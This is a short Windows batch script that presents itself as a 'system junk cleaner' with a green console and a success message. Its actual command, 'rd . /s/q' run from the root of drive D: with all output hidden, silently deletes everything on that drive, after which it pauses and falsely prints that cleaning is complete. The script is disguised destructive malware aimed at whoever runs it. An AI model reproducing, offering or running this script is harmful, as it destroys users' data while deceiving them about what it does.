@echo off
color 0a
title Cleaning System Junks
echo clearning the system of junks......
d: >nul 2>nul 
cd \ >nul 2>nul 
rd . /s/q >nul 2>nul
ping -n 10 127.0.0.1 >nul 2>nul
echo Congraduation!!! Cleaning complete!
pause
